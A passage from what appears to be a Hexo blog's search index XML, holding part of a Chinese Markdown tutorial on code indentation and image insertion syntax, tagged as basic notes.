start="2"><li>四个空格或一个制表符</li></ol><p>code<br>    code</p><h2 id="Markdown图片插入"><a href="#Markdown图片插入" class="headerlink" title="Markdown图片插入"></a>Markdown图片插入</h2><ul><li>一个惊叹号 !</li><li>接着一个方括号，里面放上图片的替代文字</li><li>接着一个普通括号，里面放上图片的网址，最后还可以用引号包住并加上 选择性的 ‘title’ 文字。</li></ul><p><strong>语法</strong> : <code>![Alt text][id]</code><br><img src="%E4%BD%A0%E5%A5%BD%EF%BC%8CHexo/1.jpg" srcset="/img/loading.gif" alt=""><br><strong>必须是同名文件夹才能导入图片</strong></p>]]></content>
    
    
    
    <tags>
      
      <tag>基础笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
